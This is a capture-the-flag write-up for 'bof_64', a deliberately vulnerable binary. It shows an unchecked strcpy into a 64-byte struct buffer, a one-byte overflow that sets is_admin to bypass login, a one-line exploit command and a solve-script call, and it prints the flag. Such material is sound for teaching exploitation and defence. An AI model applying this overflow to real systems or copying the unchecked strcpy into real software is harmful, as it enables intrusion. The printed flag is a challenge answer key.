# bof_64 — Writeup

**Category:** PWN  
**Flag:** `ictf{buffer_overfl0w_1s_d@nger0us}`

---

## Overview

A classic 64-bit stack buffer overflow. `strcpy()` copies user input into a 64-byte buffer without bounds checking. The adjacent struct fields include `is_admin` and `do_not_exagerate`. Overflowing by exactly 1 byte sets `is_admin` to non-zero while leaving `do_not_exagerate` at zero, bypassing authentication and spawning a shell.

---

## Solution

The vulnerable struct is packed:

```c
struct __attribute__((packed)) login_state {
    char buffer[64];   // offset 0
    int  is_admin;     // offset 64
    int  do_not_exagerate; // offset 68
};
strcpy(state.buffer, user_input);  // no bounds check
```

Sending 65 bytes:
- Bytes 0–63 fill `buffer`
- Byte 64 (value `0x41` = `'A'`) overwrites the first byte of `is_admin` → non-zero
- `do_not_exagerate` remains `0`
- Condition `is_admin && !do_not_exagerate` is true → `show_flag()` is called

```bash
./bof_64 $(python3 -c 'print("A"*65)')
```

### Automated exploit

```bash
python3 writeup/solve.py <host> <port>
```

---

## Flag

`ictf{buffer_overfl0w_1s_d@nger0us}`
